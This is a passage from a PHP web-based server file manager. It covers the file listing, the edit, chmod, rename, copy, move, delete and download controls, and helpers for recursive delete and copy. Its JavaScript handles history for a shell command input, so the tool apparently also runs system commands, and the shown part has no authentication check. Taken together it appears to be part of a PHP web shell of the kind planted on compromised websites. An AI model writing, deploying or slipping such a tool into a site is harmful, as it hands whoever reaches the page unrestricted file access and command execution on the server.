    <div class="table-wrap">
        <form id="batchForm" method="POST">
            <input type="hidden" name="batch_action" id="batch_action" value="">
            <table>
                <thead>
                    <tr>
                        <th class="checkbox-col"><input type="checkbox" id="selectAll"></th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (count($allItems) === 0): ?>
                    <tr><td colspan="6" style="text-align:center;color:#999;padding:40px;">Directory is empty</td></tr>
                    <?php endif; ?>
                    
                    <?php foreach ($allItems as $item): 
                        $fullPath = $currentPath . DIRECTORY_SEPARATOR . $item;
                        $isDir = is_dir($fullPath);
                        $isHidden = substr($item, 0, 1) == '.';
                        $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
                        $size = $isDir ? '-' : formatSize(filesize($fullPath));
                        $mtime = date('Y-m-d H:i:s', filemtime($fullPath));
                        $icon = $isDir ? '📁' : ($isHidden ? '🔒' : '📄');
                        $badge = $isDir ? '<span class="badge badge-dir">Dir</span>' : '<span class="badge badge-file">File</span>';
                        if ($isHidden) $badge .= ' <span class="badge badge-hidden">Hidden</span>';
                        $rowClass = $isHidden ? 'hidden-file' : '';
                    ?>
                    <tr class="<?php echo $rowClass; ?>">
                        <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>" class="item-checkbox"></td>
                        <td>
                            <?php if ($isDir): ?>
                                <a href="?dir=<?php echo urlencode($currentDir . DIRECTORY_SEPARATOR . $item); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" style="text-decoration:none;color:#2c3e50;">
                                    <span class="item-icon"><?php echo $icon; ?></span>
                                    <span class="item-name"><?php echo htmlspecialchars($item); ?></span>
                                </a>
                            <?php else: ?>
                                <span class="item-icon"><?php echo $icon; ?></span>
                                <span class="item-name"><?php echo htmlspecialchars($item); ?></span>
                            <?php endif; ?>
                            <?php echo $badge; ?>
                        </td>
                        <td class="item-size"><?php echo $size; ?></td>
                        <td>
                            <?php echo $perms; ?>
                            <a href="#" onclick="showChmod('<?php echo htmlspecialchars($item); ?>', '<?php echo $perms; ?>'); return false;" class="btn btn-xs btn-warning">Chmod</a>
                        </td>
                        <td class="item-time"><?php echo $mtime; ?></td>
                        <td class="actions">
                            <?php if ($isDir): ?>
                                <a href="?dir=<?php echo urlencode($currentDir . DIRECTORY_SEPARATOR . $item); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" class="btn btn-primary btn-xs">Open</a>
                            <?php else: ?>
                                <a href="?view=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($currentDir); ?>" target="_blank" class="btn btn-info btn-xs">View</a>
                                <a href="?download=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($currentDir); ?>" class="btn btn-success btn-xs">Download</a>
                                <a href="?edit=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($currentDir); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" class="btn btn-warning btn-xs">Edit</a>
                            <?php endif; ?>
                            <a href="#" onclick="showRename('<?php echo htmlspecialchars($item); ?>'); return false;" class="btn btn-primary btn-xs">Rename</a>
                            <a href="#" onclick="showCopy('<?php echo htmlspecialchars($item); ?>'); return false;" class="btn btn-info btn-xs">Copy</a>
                            <a href="#" onclick="showMove('<?php echo htmlspecialchars($item); ?>'); return false;" class="btn btn-purple btn-xs">Move</a>
                            <a href="?delete=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($currentDir); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')" class="btn btn-danger btn-xs">Delete</a>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </form>
    </div>
    
    <?php if (!empty($editFile) && file_exists($editPath)): ?>
    <div class="editor-area">
        <h3>✏️ Editing: <?php echo htmlspecialchars($editFile); ?></h3>
        <form method="POST">
            <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($editPath); ?>">
            <textarea name="content"><?php echo htmlspecialchars($editContent); ?></textarea>
            <div style="margin-top:10px;">
                <button type="submit" name="save_file" class="btn btn-success">💾 Save</button>
                <a href="?dir=<?php echo urlencode($currentDir); ?>&show_hidden=<?php echo $showHidden ? '1' : '0'; ?>" class="btn btn-danger">Cancel</a>
            </div>
        </form>
    </div>
    <?php endif; ?>
    
    <div class="status-bar">
        <span>📊 <?php echo count($allItems); ?> items</span>
        <span>🔒 <?php echo substr(sprintf('%o', fileperms($currentPath)), -4); ?></span>
        <span>💾 Free: <?php echo formatSize(disk_free_space($currentPath)); ?></span>
        <span>📅 <?php echo date('Y-m-d H:i:s'); ?></span>
        <span>📍 Script: <?php echo htmlspecialchars($scriptDir); ?></span>
    </div>
</div>

<!-- Modals -->
<div id="renameModal" class="modal">
    <div class="modal-content">
        <h3>✏️ Rename</h3>
        <form method="POST" id="renameForm">
            <input type="hidden" name="old_name" id="rename_old">
            <label>New Name</label>
            <input type="text" name="new_name" id="rename_new" required>
            <div style="display:flex;gap:10px;">
                <button type="submit" name="rename" class="btn btn-success">Rename</button>
                <button type="button" onclick="closeModal('renameModal')" class="btn btn-danger">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="copyModal" class="modal">
    <div class="modal-content">
        <h3>📋 Copy</h3>
        <form method="POST" id="copyForm">
            <input type="hidden" name="copy_source" id="copy_source">
            <label>Target Name</label>
            <input type="text" name="copy_target" id="copy_target" required>
            <div style="display:flex;gap:10px;">
                <button type="submit" name="copy" class="btn btn-success">Copy</button>
                <button type="button" onclick="closeModal('copyModal')" class="btn btn-danger">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="moveModal" class="modal">
    <div class="modal-content">
        <h3>📦 Move</h3>
        <form method="POST" id="moveForm">
            <input type="hidden" name="move_source" id="move_source">
            <label>Target Name</label>
            <input type="text" name="move_target" id="move_target" required>
            <div style="display:flex;gap:10px;">
                <button type="submit" name="move" class="btn btn-success">Move</button>
                <button type="button" onclick="closeModal('moveModal')" class="btn btn-danger">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="chmodModal" class="modal">
    <div class="modal-content">
        <h3>🔒 Change Permissions</h3>
        <form method="POST" id="chmodForm">
            <input type="hidden" name="chmod_path" id="chmod_path">
            <label>Permissions (e.g., 0777, 0755, 0644)</label>
            <input type="text" name="permissions" id="chmod_perms" required placeholder="0755">
            <div style="display:flex;gap:10px;">
                <button type="submit" name="chmod" class="btn btn-success">Apply</button>
                <button type="button" onclick="closeModal('chmodModal')" class="btn btn-danger">Cancel</button>
            </div>
        </form>
    </div>
</div>

<script>
function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    var k = 1024;
    var sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    var i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function showModal(id) {
    document.getElementById(id).classList.add('active');
}

function closeModal(id) {
    document.getElementById(id).classList.remove('active');
}

function showRename(name) {
    document.getElementById('rename_old').value = name;
    document.getElementById('rename_new').value = name;
    showModal('renameModal');
}

function showCopy(name) {
    document.getElementById('copy_source').value = name;
    document.getElementById('copy_target').value = name + '_copy';
    showModal('copyModal');
}

function showMove(name) {
    document.getElementById('move_source').value = name;
    document.getElementById('move_target').value = name;
    showModal('moveModal');
}

function showChmod(name, perms) {
    document.getElementById('chmod_path').value = name;
    document.getElementById('chmod_perms').value = perms;
    showModal('chmodModal');
}

document.getElementById('selectAll').addEventListener('change', function() {
    var checkboxes = document.querySelectorAll('.item-checkbox');
    for (var i = 0; i < checkboxes.length; i++) {
        checkboxes[i].checked = this.checked;
    }
});

document.querySelectorAll('.modal').forEach(function(modal) {
    modal.addEventListener('click', function(e) {
        if (e.target === this) {
            this.classList.remove('active');
        }
    });
});

document.querySelector('[name="batch_action"]').addEventListener('change', function() {
    if (this.value) {
        if (confirm('Execute batch operation?')) {
            document.getElementById('batch_action').value = this.value;
            document.getElementById('batchForm').submit();
        }
    }
});

document.querySelector('.quick-nav input[type="text"]').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        this.form.submit();
    }
});

// Command input history (simple)
var cmdHistory = [];
var cmdIndex = -1;
var cmdInput = document.querySelector('.cmd-area input[name="command"]');
if (cmdInput) {
    cmdInput.addEventListener('keydown', function(e) {
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (cmdIndex < cmdHistory.length - 1) {
                cmdIndex++;
                this.value = cmdHistory[cmdHistory.length - 1 - cmdIndex] || '';
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (cmdIndex > 0) {
                cmdIndex--;
                this.value = cmdHistory[cmdHistory.length - 1 - cmdIndex] || '';
            } else {
                cmdIndex = -1;
                this.value = '';
            }
        } else if (e.key === 'Enter') {
            if (this.value.trim()) {
                cmdHistory.push(this.value.trim());
                cmdIndex = -1;
            }
        }
    });
}
</script>
</body>
</html>
<?php

function formatSize($bytes) {
    if ($bytes === false || $bytes === 0) return '0 B';
    $k = 1024;
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes) / log($k));
    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
}

function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir . DIRECTORY_SEPARATOR . $object)) {
                    rrmdir($dir . DIRECTORY_SEPARATOR . $object);
                } else {
                    unlink($dir . DIRECTORY_SEPARATOR . $object);
                }
            }
        }
        rmdir($dir);
    }
}

function rcopy($src, $dst) {
    if (is_dir($src)) {
        mkdir($dst, 0777, true);
        $files = scandir($src);
        foreach ($files as $file) {
            if ($file != "." && $file != "..") {
                rcopy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file);
            }
        }
    } else {
        copy($src, $dst);
    }
}
?>
